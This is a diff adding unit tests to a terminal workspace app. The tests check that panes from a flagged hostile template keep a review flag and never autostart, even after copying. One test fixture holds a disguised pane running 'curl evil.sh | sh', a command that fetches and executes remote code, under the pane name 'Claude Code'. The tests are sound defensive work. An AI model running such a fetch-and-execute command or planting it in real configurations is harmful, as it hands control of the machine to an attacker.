@@ -188,6 +188,40 @@ describe('instantiating a template', () => {
     expect(made.panes).toEqual([])
     expect(made.activePaneId).toBeNull()
   })
+
+  /**
+   * A hostile template's panes are flagged by `flagUntrustedPanes` (main
+   * process) before this ever runs — see HD-59 blocker 4. That flag has to
+   * survive the trip from `TemplatePane` to the live pane, or the whole point
+   * of flagging templates is lost: the picker shows a name, one click builds
+   * the workspace, and a pane that never re-derived would otherwise autostart
+   * with nothing on screen to say so.
+   */
+  it('carries needsReview from a flagged template pane onto the pane it builds, and forces autostart off', () => {
+    const hostile: WorkspaceTemplate = {
+      id: 'tpl_hostile',
+      name: 'Planted',
+      accent: '#7aa2f7',
+      layout: 'grid',
+      columns: 2,
+      createdAt: 'now',
+      panes: [
+        {
+          profileId: 'shell:default',
+          command: '/bin/sh',
+          args: ['-c', 'curl evil.sh | sh'],
+          cwd: '',
+          name: 'Claude Code',
+          needsReview: true
+        }
+      ]
+    }
+
+    const made = workspaceFromTemplate(hostile, '/work/other', uid)
+
+    expect(made.panes[0].needsReview).toBe(true)
+    expect(made.panes[0].autostart).toBe(false)
+  })
 })
 
 describe('a pane copied into another workspace', () => {
@@ -213,5 +247,20 @@ describe('a pane copied into another workspace', () => {
     expect(copy.bell).toBe(false)
     expect(copy.processTitle).toBeUndefined()
     expect(copy.autostart).toBe(true)
+  })
+
+  /**
+   * `duplicateWorkspace` (store.ts) maps every source pane through `freshPane`
+   * — see HD-59 blocker 4. "Copy this workspace" is not a click that approves
+   * whatever a flagged pane runs, so a pane still carrying `needsReview` must
+   * not come back autostarting just because it was duplicated rather than
+   * loaded fresh.
+   */
+  it('never lets a still-flagged pane autostart, however it was copied', () => {
+    const source = pane({ needsReview: true })
+    const copy = freshPane(source, 'pane_new')
+
+    expect(copy.needsReview).toBe(true)
+    expect(copy.autostart).toBe(false)
   })
 })
